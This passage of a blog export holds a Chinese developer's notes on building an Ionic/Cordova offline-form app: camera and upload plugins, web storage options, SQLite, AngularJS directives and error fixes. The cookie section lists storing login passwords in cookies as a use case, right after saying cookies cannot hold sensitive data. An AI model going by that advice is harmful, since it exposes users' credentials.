##\n调用图库和拍照都是使用`cordova-plugin-camera`插件，值得一提的时候，这个插件调用图库选图片的时候一次只能选一张，如果想一次选多张可以使用`cordova-imagePicker`插件。他的`CameraOptions`中，把`saveToPhotoAlbum`设为`true`，可以在拍照的时候保存下来图片，默认是`false`。使用camera插件选图或拍照后会得到一个imgURI，是图片的缓存路径，存储的时候存储这个路径，上传的时候从这个路径里上传图片。\n\n照片上传使用这个插件：`$cordovaFileTransfer`\n用法文档参考链接：\n1. [论坛](https://forum.ionicframework.com/t/cordova-file-transfer-upload-image-from-device/40517)\n2. [cordova-plugin-file-transfer github](https://github.com/apache/cordova-plugin-file-transfer)\n3. [$cordovaFileTransfer文档](http://ngcordova.com/docs/plugins/fileTransfer/)\n\n## 离线存储技术简介 ##\nHTML5中关于离线的API主要分为应用缓存（Appcache）和客户端存储两大块。\n \n### 应用缓存（Appcache） ###\n应用缓存关键词为manifest，主要是在网页的根html标签中添加manifest属性，属性值为保存着需要缓存资源清单的文件的地址。实例:\n```\n<!DOCTYPE HTML>\n<html manifest=\"demo.appcache\">\n</html>\n```\n关于怎样使用，这个链接讲的非常好：[应用缓存初级使用指南](http://www.html5rocks.com/zh/tutorials/appcache/beginner/)。\n需要应用到manifest的场景是——离线网页应用，就是使用前不需要用户下载一个APP或者是别的任何东西，而是访问一个网址，第一次访问时，就把这个网页上需要缓存的东西，例如JS文件、CSS文件、网页中用到的图片、图标等，下载到浏览器，然后即使离线情况下，刷新网页，也还是可以使用。\n\n### 客户端数据存储 ###\n分类概览：\n\n- Cookie\n- Web Storage\n    * localStorage(前身是globalStorage)\n    * sessionStorage\n- 数据库存储\n    * Web SQL Database\n    * IndexedDB\n\n| 名称   |  大小    |  过期时间  | 与服务器通信 |\n| :------|  :------ |  :-----  |    :------  |\n| Cookie |  单域名下总大小4K左右，25个/50个/30个 |  默认关浏览器就过期，设置了过期时间，到过期时间才过期| 每次附在请求头中|\n| localStorage |单域名下5M或2.5M |  永久保存在浏览器中，除非手动清除 |  不参与通信  |\n| sessionStorage|单域名下5M或2.5M|  保存到浏览器关闭，可以跨越页面刷新而存在  |  不参与通信  |\n\n#### Cookie ####\n**缺点**\n\n  1. 容量小，超过容量就被浏览器默默丢掉，你啥都不知道~~(想起囧不懂)~~ ；\n  2. 使用起来很不方便，需要封装工具方法；\n  3. 每次都会附在请求头中发送，影响请求性能；\n\n由于这些限制，只能保存比较少的信息，且由于用户可以查看和改写cookie，所以不能存储敏感信息。\n\n**使用场景：**\n登录时保存密码，以前还用来保存用户进行购物车操作时的信息，现在可以用localStorage代替。\n\n#### localStorage ####\n缺点：只能存储字符串。非字符串的数据在存储之前会被转换成字符串\n#### sessionStorage ####\n\n1. 缺点只能存储字符串。\n2. 绑定于某个服务器会话，所以本地运行时不可用，\n3. 存储在 sessionStorage中的数据只能由最初给对象存储数据的页面访问到，所以对多页面应用有限制。\n\n#### Web SQL 和 IndexedDB ####\nSQLite本身是一个关系数据库管理系统，HTML5拿来封了一套API以实现客户端数据库存储，就是Web SQL，但由于拿来别人的东西使用，就只能就一些边边角角的标准进行定义，这并不是W3C想要的，于是现在Web SQL已经被废弃，而另起炉灶创建了IndexDB，但由于现在IndexDB的一些功能还停留在草案阶段，所以SQLite还是有一定的市场。\n\n## 使用SQLite的经验 ##\n本来项目使用了localStorage来做存储，但后来客户坚持要求使用SQLite，以便未来扩展APP功能时可以对数据进行搜索排序等，于是就重写了相关代码。\n**参考教程地址：**\n\n1. [W3C](https://www.w3.org/TR/webdatabase/#executing-sql-statements)\n2. [菜鸟网，可以作为API查询](http://www.runoob.com/sqlite/sqlite-drop-table.html)\n3. [A Simple TODO list using HTML5 WebDatabases](http://www.html5rocks.com/en/tutorials/webdatabase/todo/#toc-step3)\n4. [使用 HTML5 开发离线应用](https://www.ibm.com/developerworks/cn/web/1011_guozb_html5off/)\n\n**评价：**\n优点：如果需要数据搜索、排序等，可以使用\n缺点：异步操作，操作结果的后续动作需要写在回调函数里，如果需要频繁存取，或者逻辑比较复杂，会产生很复杂的嵌套，不便于维护、并且是已经被废弃的标准\n\n## ionic 点击小图显示大图 ##\n1. [ionic click small image show big image](https://devdactic.com/images-videos-fullscreen-ionic/)\n2. [Ionic Modal - Fullscreen images](https://codepen.io/rdelafuente/pen/tJrik/)\n3. [How To Display Images and Videos with Ionic Really Cool](https://devdactic.com/images-videos-fullscreen-ionic/)\n\n## 判断手机网络状况 ##\n[$cordovaNetwork](http://ngcordova.com/docs/plugins/network/)\n\n## 使用$state.go切换状态之前，检查token  ##\n[angular ui-router login authentication](http://stackoverflow.com/questions/22537311/angular-ui-router-login-authentication)\n\n## Base64解码 ##\n[Base64 编码与解码](http://www.w3cfuns.com/notes/13967/3f397874b7afbe49eaa678f3331bf5e0.html)\n\n## angularJS $Watch元素高度变化 ##\n需求背景是，输入框一开始高度是一行，输入多行时高度自适应，达到6行时，固定高度，出滚动条，textarea做不到这些，于是使用了可编辑div做输入框，给div标签加了`contenteditable = true`属性。然后需求就是要监听其高度变化。如果是input输入框就可以用ng-change事件监听，但这个不行要手动写一个。\n\n使用directive，首先想到使用scope.$watch() 监听div的html改变，可是失败了，因为只有当onblur的时候才会触发$watch计算高度改变，而我要的是在输入的时候，随时监听，以在换行时发现高度改变。【失败代码】：\n```\n.directive('logdirective',function(){ \n    return { \n        link:function(scope, ele, attrs){ \n            scope.$watch(function(){ \n                return ele[0].html; \n                }, function(newVal, oldVal){ \n                console.log('height change!'); \n                console.log(newVal); \n            },true); \n        } \n    } \n});\n```\n\n最后不得不使用一个interval来定时检测高度变化，【成功代码】：\n```\n.directive('logdirective',function($interval){\n            return {\n                link:function(scope, ele, attrs){\n                    var timer = null;\n                    var memHeight = ele[0].offsetHeight;\n\n                    ele.on('focus', function(){\n                        $interval.cancel(timer);\n                        timer = $interval(function(){\n                            var oldVal = memHeight,\n                                newVal = ele[0].offsetHeight;\n                            memHeight = newVal;\n                            if(newVal !== oldVal){\n                                console.log('height changed!');\n                                return;\n                            }\n                        },1000);\n\n                        timer.then(function(){\n                            console.log('timer resolved');\n                        }, function(){\n                            console.log('timer rejected');\n                        });\n                    });\n\n                    ele.on('blur', function(){\n                        $interval.cancel(timer);\n                    });\n                }\n            }\n        });\n```\n\n\n# Error篇\n\n## cordova already defined ##\n原因：index页面重复引入了 cordova .js，删除一个就好\n\n## ionic页面滚动时，因为父级使用了transform，导致内容中Position:fixed失效  ##\n关键词：ionic scroll fixed\n解决方案：[把该元素拿到`<ion-content>`外面](https://forum.ionicframework.com/t/css-position-fixed/2969 '把该元素拿到`<ion-content>`外面')\n\n如果不是在ionic中，其他思路：\n\n1. 去transform滚动，自己写滚动，\nionic 禁止滚动：在`<ion-content>`上添加scroll = false\n[angularJS绑定滚动事件](https://segmentfault.com/q/1010000005666477/a-1020000005677694 '这是一个链接')\n2. 各种hack方案\n[Positions fixed doesn't work when using -webkit-transform](http://stackoverflow.com/questions/2637058/positions-fixed-doesnt-work-when-using-webkit-transform '这是一个链接')\n3. 拓展：\n[摆脱jquery!angularjs利用指令简单实现滚动翻页](http://www.ddhigh.com/2014/09/angularjs-lazy-load/ '这是一个链接')\n\n## ionic滚动时，ion-content 高度计算错误 ，不能显示全部内容 ##\n![ionic_hybrid/heightWrong.jpg](ionic_hybrid/heightWrong.jpg)\n解决方案：\n在ion-content上加上\n```\n{   position: absolute;\n    top: 0;\n    left: 0;\n    bottom: 0;\n    right: 0;\n    margin: auto;\n}\n```\n**注意：**top和bottom值必须为零，如果需要间隔，在ion-content的子元素上加margin，而不要修改top值或bottom值，否则会造成高度计算不正确，还是不能正常显示全部内容。\n\n## 上传图片： ##\n后台是用ASP.NET接收的，写法参考链接：\n\n1. [Upload image from phonegap app to WCF service](http://stackoverflow.com/questions/17232183/upload-image-from-phonegap-app-to-wcf-service)\n2. [Upload image from android phonegap to a server using asmx](http://stackoverflow.com/questions/8643708/upload-image-from-android-phonegap-to-a-server-using-asmx)\n\n### 问题1：不能发出请求 ###\nconsole出来错误是：\n```\nupload error source \nupload error target\n```\n\n以及会Alert:（一次只Alert一个，code=1或者code=3，这两种都遇到过）\n```\nAn error has occurred : code =1  \nAn error has occurred : code =3\n```\n\ncode = 1最终解决方案：\n原因：传送的文件大小超出服务器接收限度\n```\n<system.serviceModel> \n  <bindings> \n\n//其他的setting, 藍色是新增的 \n\n  <webHttpBinding> \n\n  <binding maxReceivedMessageSize=\"2147483647\" /> \n\n  </webHttpBinding> \n\n  </bindings> \n```\n这是加在后台的，我也不太懂，后台摸索好久，一开始加的地方不对，据后台说需要加到最外层，才变好了。\n\n**解决方案参考链接：**\n\n1. [Phonegap File Transfer of picture fails on every other picture: Error code 3 with FileTransfer upload](http://stackoverflow.com/questions/19275268/phonegap-file-transfer-of-picture-fails-on-every-other-picture-error-code-3-wit)\n2. [File upload error code 1 in ng-cordova filetransfer plugin](http://stackoverflow.com/questions/30783847/file-upload-error-code-1-in-ng-cordova-filetransfer-plugin)\n3. [Best way to transfer a picture it to a server](https://forum.ionicframework.com/t/best-way-to-transfer-a-picture-it-to-a-server/53326\nhttps://github.com/dtaalbers/ionic-2-examples/tree/master/file-transfer-uploa)\n4. [Problems with image URL when uploading with file transfer plugin(最大长度)](https://forum.ionicframework.com/t/problems-with-image-url-when-uploading-with-file-transfer-plugin/50230)\n5. [cordova file transfer文档，code代表的含义](https://cordova.apache.org/docs/en/latest/reference/cordova-plugin-file-transfer/#installation)\n6. [Retrieve HTTP headers in Cordova File Transfer ASP Server](http://stackoverflow.com/questions/32862953/retrieve-http-headers-in-cordova-file-transfer-asp-server)\n\n### 上传数据的格式 ###\n解决了code=1，后台可以接收到请求之后，后台不知道我传过去的数据是什么格式的，我也不知道，因为从浏览器的network里看不到相关信息，cordova-file-transfer文档里也看不到相关介绍。于是后台那边只能看到一张全黑的图片，他们搞了两天，最后终于找到说安装了一个解析包：`HttpMultipartParser`然后就能正常解析了，并且搞明白了传过去的格式是stream，里面包含了图片数据和uploadOptions里的参数。后台筒子们，我只能帮你们到这了。\n\n### $on('$stateChangeStart')中使用$state.go会导致无限循环的问题 ###\n[Ui-Router $state.go inside $on('$stateChangeStart') is cauzing an infinite loop](http://stackoverflow.com/questions/26796945/ui-router-state-go-inside-onstatechangestart-is-cauzing-an-infinite-loop)\n\n### npm install 时的问题 ###\n[unmet dependency but will load](https://github.com/vigetlabs/gulp-starter/issues/62)\n按照答案中的方法之后会报错：\n`'rm' 不是内部或外部命令，也不是可运行的程序 或批处理文件。`\n原因：rm是linux中的命令\n解决方案：\n使用git bash 打开项目文件夹，\nrm -rf $HOME/.npm\nnpm cache clean\n然后再回node shell中使用npm install\n\n### npm install的时候，不能自动安装插件，build出来的APK包plugin丢失， ###\n是因为在安装cordova插件的时候，本应该使用这样的安装命令`cordova plugin add XXX --save`，但我没有加 `--save`，这个`--save`的作用是会自动保存插件的信息到项目根目录下的config.xml，这样在npm install的时候就会根据config.xml文件来自动安装插件\n\n# 其他 #\n## angular 如何刷新页面 ##\n需求：多个状态都会跳转到某个state，有一些跳转需要刷新，有一些不需要刷新\n解决方案：\n全部需要刷新的时候，就在state里加上`cache:false`;\n部分需要刷新的时候，使用$rootScope.$broadcast()，把需要刷新的初始化函数放在 $rootScope.$on的回调函数里\n\n## AngularJS定时器 ##\n1. [说说Angular中的$timeOut定时器](http://sentsin.com/web/486.html)\n2. [AngularJS中$interval的用法详解](http://www.codesec.net/view/406326.html)\n\n## Array的删除splice和for循环合用时的一个小坑  ##\nArray的删除splice和for循环合用时，由于Array删除一项之后，影响到length和后面项的索引值，所以一定要注意。正确代码：\n```\nvar i=0; \nfor(i; i< arr.length; ){ \n  if(arr[i].isSelected===true){ \n    arr.splice(i,1); \n  }else {i++;} \n}\n```\n---\n参考链接：\n1. [详说 Cookie, LocalStorage 与 SessionStorage](http://jerryzou.com/posts/cookie-and-web-storage/)\n2. [Why is Web SQL database deprecated?](http://programmers.stackexchange.com/questions/220254/why-is-web-sql-database-deprecated)\n3. [Ion-content height:100% is not working](https://forum.ionicframework.com/t/ion-content-height-100-is-not-working/28667/2)","slug":"note-about-hybridAPP-project","published":1,"updated":"2018-08-04T03:36:53.245Z","layout":"post","photos":[],"link":"","_id":"cjkux5ews0000kq95kzvxn338","content":"<p>本篇主要记录了我遇到的一些问题，和解决方案，以供参考。问题比较杂乱，简单分了一下类，感觉还是不太清晰π__π，但是感觉也没有人会需要全篇内容吧，如果能在你报了某个错误时，我的某个解决方案能给你一点启发，那就是做好事啦~<br><a id=\"more\"></a></p>\n<h1 id=\"APP需求背景简介\"><a href=\"#APP需求背景简介\" class=\"headerlink\" title=\"APP需求背景简介\"></a>APP需求背景简介</h1><p>这个APP的需求简单来说是这样的：</p>\n<ol>\n<li>在有网络的环境中打开APP时，从后台下载表单资料(下拉选项等)保存在Device，无网络环境下从Device读取表单资料；</li>\n<li>用户填写表单并保存后，信息保存在Device，并且如果网络允许，进行自动上传到后台服务器，如果网络不允许，将等到网络允许时上传；</li>\n<li>网络区分WIFI和3G/4G，WIFI下自动上传，3G/4G下如果用户选了Allow 3G，就自动上传，否则当用户点击上传时才上传，并且开始上传后用户可以点击停止以终止上传。</li>\n<li>填写表单时，用户可以添加手机图库的图片，也可以拍照</li>\n</ol>\n<h1 id=\"方案篇\"><a href=\"#方案篇\" class=\"headerlink\" title=\"方案篇\"></a>方案篇</h1><h2 id=\"照片离线存储、上传：\"><a href=\"#照片离线存储、上传：\" class=\"headerlink\" title=\"照片离线存储、上传：\"></a>照片离线存储、上传：</h2><p>调用图库和拍照都是使用<code>cordova-plugin-camera</code>插件，值得一提的时候，这个插件调用图库选图片的时候一次只能选一张，如果想一次选多张可以使用<code>cordova-imagePicker</code>插件。他的<code>CameraOptions</code>中，把<code>saveToPhotoAlbum</code>设为<code>true</code>，可以在拍照的时候保存下来图片，默认是<code>false</code>。使用camera插件选图或拍照后会得到一个imgURI，是图片的缓存路径，存储的时候存储这个路径，上传的时候从这个路径里上传图片。</p>\n<p>照片上传使用这个插件：<code>$cordovaFileTransfer</code><br>用法文档参考链接：</p>\n<ol>\n<li><a href=\"https://forum.ionicframework.com/t/cordova-file-transfer-upload-image-from-device/40517\" target=\"_blank\" rel=\"noopener\">论坛</a></li>\n<li><a href=\"https://github.com/apache/cordova-plugin-file-transfer\" target=\"_blank\" rel=\"noopener\">cordova-plugin-file-transfer github</a></li>\n<li><a href=\"http://ngcordova.com/docs/plugins/fileTransfer/\" target=\"_blank\" rel=\"noopener\">$cordovaFileTransfer文档</a></li>\n</ol>\n<h2 id=\"离线存储技术简介\"><a href=\"#离线存储技术简介\" class=\"headerlink\" title=\"离线存储技术简介\"></a>离线存储技术简介</h2><p>HTML5中关于离线的API主要分为应用缓存（Appcache）和客户端存储两大块。</p>\n<h3 id=\"应用缓存（Appcache）\"><a href=\"#应用缓存（Appcache）\" class=\"headerlink\" title=\"应用缓存（Appcache）\"></a>应用缓存（Appcache）</h3><p>应用缓存关键词为manifest，主要是在网页的根html标签中添加manifest属性，属性值为保存着需要缓存资源清单的文件的地址。实例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE HTML&gt;</span><br><span class=\"line\">&lt;html manifest=&quot;demo.appcache&quot;&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>关于怎样使用，这个链接讲的非常好：<a href=\"http://www.html5rocks.com/zh/tutorials/appcache/beginner/\" target=\"_blank\" rel=\"noopener\">应用缓存初级使用指南</a>。<br>需要应用到manifest的场景是——离线网页应用，就是使用前不需要用户下载一个APP或者是别的任何东西，而是访问一个网址，第一次访问时，就把这个网页上需要缓存的东西，例如JS文件、CSS文件、网页中用到的图片、图标等，下载到浏览器，然后即使离线情况下，刷新网页，也还是可以使用。</p>\n<h3 id=\"客户端数据存储\"><a href=\"#客户端数据存储\" class=\"headerlink\" title=\"客户端数据存储\"></a>客户端数据存储</h3><p>分类概览：</p>\n<ul>\n<li>Cookie</li>\n<li>Web Storage<ul>\n<li>localStorage(前身是globalStorage)</li>\n<li>sessionStorage</li>\n</ul>\n</li>\n<li>数据库存储<ul>\n<li>Web SQL Database</li>\n<li>IndexedDB</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">名称</th>\n<th style=\"text-align:left\">大小</th>\n<th style=\"text-align:left\">过期时间</th>\n<th style=\"text-align:left\">与服务器通信</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">Cookie</td>\n<td style=\"text-align:left\">单域名下总大小4K左右，25个/50个/30个</td>\n<td style=\"text-align:left\">默认关浏览器就过期，设置了过期时间，到过期时间才过期</td>\n<td style=\"text-align:left\">每次附在请求头中</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">localStorage</td>\n<td style=\"text-align:left\">单域名下5M或2.5M</td>\n<td style=\"text-align:left\">永久保存在浏览器中，除非手动清除</td>\n<td style=\"text-align:left\">不参与通信</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">sessionStorage</td>\n<td style=\"text-align:left\">单域名下5M或2.5M</td>\n<td style=\"text-align:left\">保存到浏览器关闭，可以跨越页面刷新而存在</td>\n<td style=\"text-align:left\">不参与通信</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h4><p><strong>缺点</strong></p>\n<ol>\n<li>容量小，超过容量就被浏览器默默丢掉，你啥都不知道<del>(想起囧不懂)</del> ；</li>\n<li>使用起来很不方便，需要封装工具方法；</li>\n<li>每次都会附在请求头中发送，影响请求性能；</li>\n</ol>\n<p>由于这些限制，只能保存比较少的信息，且由于用户可以查看和改写cookie，所以不能存储敏感信息。</p>\n<p><strong>使用场景：</strong><br>登录时保存密码，以前还用来保存用户进行购物车操作时的信息，现在可以用localStorage代替。</p>\n<h4 id=\"localStorage\"><a href=\"#localStorage\" class=\"headerlink\" title=\"localStorage\"></a>localStorage</h4><p>缺点：只能存储字符串。非字符串的数据在存储之前会被转换成字符串</p>\n<h4 id=\"sessionStorage\"><a href=\"#sessionStorage\" class=\"headerlink\" title=\"sessionStorage\"></a>sessionStorage</h4><ol>\n<li>缺点只能存储字符串。</li>\n<li>绑定于某个服务器会话，所以本地运行时不可用，</li>\n<li>存储在 sessionStorage中的数据只能由最初给对象存储数据的页面访问到，所以对多页面应用有限制。</li>\n</ol>\n<h4 id=\"Web-SQL-和-IndexedDB\"><a href=\"#Web-SQL-和-IndexedDB\" class=\"headerlink\" title=\"Web SQL 和 IndexedDB\"></a>Web SQL 和 IndexedDB</h4><p>SQLite本身是一个关系数据库管理系统，HTML5拿来封了一套API以实现客户端数据库存储，就是Web SQL，但由于拿来别人的东西使用，就只能就一些边边角角的标准进行定义，这并不是W3C想要的，于是现在Web SQL已经被废弃，而另起炉灶创建了IndexDB，但由于现在IndexDB的一些功能还停留在草案阶段，所以SQLite还是有一定的市场。</p>\n<h2 id=\"使用SQLite的经验\"><a href=\"#使用SQLite的经验\" class=\"headerlink\" title=\"使用SQLite的经验\"></a>使用SQLite的经验</h2><p>本来项目使用了localStorage来做存储，但后来客户坚持要求使用SQLite，以便未来扩展APP功能时可以对数据进行搜索排序等，于是就重写了相关代码。<br><strong>参考教程地址：</strong></p>\n<ol>\n<li><a href=\"https://www.w3.org/TR/webdatabase/#executing-sql-statements\" target=\"_blank\" rel=\"noopener\">W3C</a></li>\n<li><a href=\"http://www.runoob.com/sqlite/sqlite-drop-table.html\" target=\"_blank\" rel=\"noopener\">菜鸟网，可以作为API查询</a></li>\n<li><a href=\"http://www.html5rocks.com/en/tutorials/webdatabase/todo/#toc-step3\" target=\"_blank\" rel=\"noopener\">A Simple TODO list using HTML5 WebDatabases</a></li>\n<li><a href=\"https://www.ibm.com/developerworks/cn/web/1011_guozb_html5off/\" target=\"_blank\" rel=\"noopener\">使用 HTML5 开发离线应用</a></li>\n</ol>\n<p><strong>评价：</strong><br>优点：如果需要数据搜索、排序等，可以使用<br>缺点：异步操作，操作结果的后续动作需要写在回调函数里，如果需要频繁存取，或者逻辑比较复杂，会产生很复杂的嵌套，不便于维护、并且是已经被废弃的标准</p>\n<h2 id=\"ionic-点击小图显示大图\"><a href=\"#ionic-点击小图显示大图\" class=\"headerlink\" title=\"ionic 点击小图显示大图\"></a>ionic 点击小图显示大图</h2><ol>\n<li><a href=\"https://devdactic.com/images-videos-fullscreen-ionic/\" target=\"_blank\" rel=\"noopener\">ionic click small image show big image</a></li>\n<li><a href=\"https://codepen.io/rdelafuente/pen/tJrik/\" target=\"_blank\" rel=\"noopener\">Ionic Modal - Fullscreen images</a></li>\n<li><a href=\"https://devdactic.com/images-videos-fullscreen-ionic/\" target=\"_blank\" rel=\"noopener\">How To Display Images and Videos with Ionic Really Cool</a></li>\n</ol>\n<h2 id=\"判断手机网络状况\"><a href=\"#判断手机网络状况\" class=\"headerlink\" title=\"判断手机网络状况\"></a>判断手机网络状况</h2><p><a href=\"http://ngcordova.com/docs/plugins/network/\" target=\"_blank\" rel=\"noopener\">$cordovaNetwork</a></p>\n<h2 id=\"使用-state-go切换状态之前，检查token\"><a href=\"#使用-state-go切换状态之前，检查token\" class=\"headerlink\" title=\"使用$state.go切换状态之前，检查token\"></a>使用$state.go切换状态之前，检查token</h2><p><a href=\"http://stackoverflow.com/questions/22537311/angular-ui-router-login-authentication\" target=\"_blank\" rel=\"noopener\">angular ui-router login authentication</a></p>\n<h2 id=\"Base64解码\"><a href=\"#Base64解码\" class=\"headerlink\" title=\"Base64解码\"></a>Base64解码</h2><p><a href=\"http://www.w3cfuns.com/notes/13967/3f397874b7afbe49eaa678f3331bf5e0.html\" target=\"_blank\" rel=\"noopener\">Base64 编码与解码</a></p>\n<h2 id=\"angularJS-Watch元素高度变化\"><a href=\"#angularJS-Watch元素高度变化\" class=\"headerlink\" title=\"angularJS $Watch元素高度变化\"></a>angularJS $Watch元素高度变化</h2><p>需求背景是，输入框一开始高度是一行，输入多行时高度自适应，达到6行时，固定高度，出滚动条，textarea做不到这些，于是使用了可编辑div做输入框，给div标签加了<code>contenteditable = true</code>属性。然后需求就是要监听其高度变化。如果是input输入框就可以用ng-change事件监听，但这个不行要手动写一个。</p>\n<p>使用directive，首先想到使用scope.$watch() 监听div的html改变，可是失败了，因为只有当onblur的时候才会触发$watch计算高度改变，而我要的是在输入的时候，随时监听，以在换行时发现高度改变。【失败代码】：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.directive(&apos;logdirective&apos;,function()&#123; </span><br><span class=\"line\">    return &#123; </span><br><span class=\"line\">        link:function(scope, ele, attrs)&#123; </span><br><span class=\"line\">            scope.$watch(function()&#123; </span><br><span class=\"line\">                return ele[0].html; </span><br><span class=\"line\">                &#125;, function(newVal, oldVal)&#123; </span><br><span class=\"line\">                console.log(&apos;height change!&apos;); </span><br><span class=\"line\">                console.log(newVal); </span><br><span class=\"line\">            &#125;,true); </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>最后不得不使用一个interval来定时检测高度变化，【成功代码】：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.directive(&apos;logdirective&apos;,function($interval)&#123;</span><br><span class=\"line\">            return &#123;</span><br><span class=\"line\">                link:function(scope, ele, attrs)&#123;</span><br><span class=\"line\">                    var timer = null;</span><br><span class=\"line\">                    var memHeight = ele[0].offsetHeight;</span><br><span class=\"line\"></span><br><span class=\"line\">                    ele.on(&apos;focus&apos;, function()&#123;</span><br><span class=\"line\">                        $interval.cancel(timer);</span><br><span class=\"line\">                        timer = $interval(function()&#123;</span><br><span class=\"line\">                            var oldVal = memHeight,</span><br><span class=\"line\">                                newVal = ele[0].offsetHeight;</span><br><span class=\"line\">                            memHeight = newVal;</span><br><span class=\"line\">                            if(newVal !== oldVal)&#123;</span><br><span class=\"line\">                                console.log(&apos;height changed!&apos;);</span><br><span class=\"line\">                                return;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;,1000);</span><br><span class=\"line\"></span><br><span class=\"line\">                        timer.then(function()&#123;</span><br><span class=\"line\">                            console.log(&apos;timer resolved&apos;);</span><br><span class=\"line\">                        &#125;, function()&#123;</span><br><span class=\"line\">                            console.log(&apos;timer rejected&apos;);</span><br><span class=\"line\">                        &#125;);</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">                    ele.on(&apos;blur&apos;, function()&#123;</span><br><span class=\"line\">                        $interval.cancel(timer);</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Error篇\"><a href=\"#Error篇\" class=\"headerlink\" title=\"Error篇\"></a>Error篇</h1><h2 id=\"cordova-already-defined\"><a href=\"#cordova-already-defined\" class=\"headerlink\" title=\"cordova already defined\"></a>cordova already defined</h2><p>原因：index页面重复引入了 cordova .js，删除一个就好</p>\n<h2 id=\"ionic页面滚动时，因为父级使用了transform，导致内容中Position-fixed失效\"><a href=\"#ionic页面滚动时，因为父级使用了transform，导致内容中Position-fixed失效\" class=\"headerlink\" title=\"ionic页面滚动时，因为父级使用了transform，导致内容中Position:fixed失效\"></a>ionic页面滚动时，因为父级使用了transform，导致内容中Position:fixed失效</h2><p>关键词：ionic scroll fixed<br>解决方案：<a href=\"https://forum.ionicframework.com/t/css-position-fixed/2969\" title=\"把该元素拿到`&lt;ion-content&gt;`外面\" target=\"_blank\" rel=\"noopener\">把该元素拿到<code>&lt;ion-content&gt;</code>外面</a></p>\n<p>如果不是在ionic中，其他思路：</p>\n<ol>\n<li>去transform滚动，自己写滚动，<br>ionic 禁止滚动：在<code>&lt;ion-content&gt;</code>上添加scroll = false<br><a href=\"https://segmentfault.com/q/1010000005666477/a-1020000005677694\" title=\"这是一个链接\" target=\"_blank\" rel=\"noopener\">angularJS绑定滚动事件</a></li>\n<li>各种hack方案<br><a href=\"http://stackoverflow.com/questions/2637058/positions-fixed-doesnt-work-when-using-webkit-transform\" title=\"这是一个链接\" target=\"_blank\" rel=\"noopener\">Positions fixed doesn’t work when using -webkit-transform</a></li>\n<li>拓展：<br><a href=\"http://www.ddhigh.com/2014/09/angularjs-lazy-load/\" title=\"这是一个链接\" target=\"_blank\" rel=\"noopener\">摆脱jquery!angularjs利用指令简单实现滚动翻页</a></li>\n</ol>\n<h2 id=\"ionic滚动时，ion-content-高度计算错误-，不能显示全部内容\"><a href=\"#ionic滚动时，ion-content-高度计算错误-，不能显示全部内容\" class=\"headerlink\" title=\"ionic滚动时，ion-content 高度计算错误 ，不能显示全部内容\"></a>ionic滚动时，ion-content 高度计算错误 ，不能显示全部内容</h2><p><img src=\"ionic_hybrid/heightWrong.jpg\" alt=\"ionic_hybrid/heightWrong.jpg\"><br>解决方案：<br>在ion-content上加上<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;   position: absolute;</span><br><span class=\"line\">    top: 0;</span><br><span class=\"line\">    left: 0;</span><br><span class=\"line\">    bottom: 0;</span><br><span class=\"line\">    right: 0;</span><br><span class=\"line\">    margin: auto;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>注意：</strong>top和bottom值必须为零，如果需要间隔，在ion-content的子元素上加margin，而不要修改top值或bottom值，否则会造成高度计算不正确，还是不能正常显示全部内容。</p>\n<h2 id=\"上传图片：\"><a href=\"#上传图片：\" class=\"headerlink\" title=\"上传图片：\"></a>上传图片：</h2><p>后台是用ASP.NET接收的，写法参考链接：</p>\n<ol>\n<li><a href=\"http://stackoverflow.com/questions/17232183/upload-image-from-phonegap-app-to-wcf-service\" target=\"_blank\" rel=\"noopener\">Upload image from phonegap app to WCF service</a></li>\n<li><a 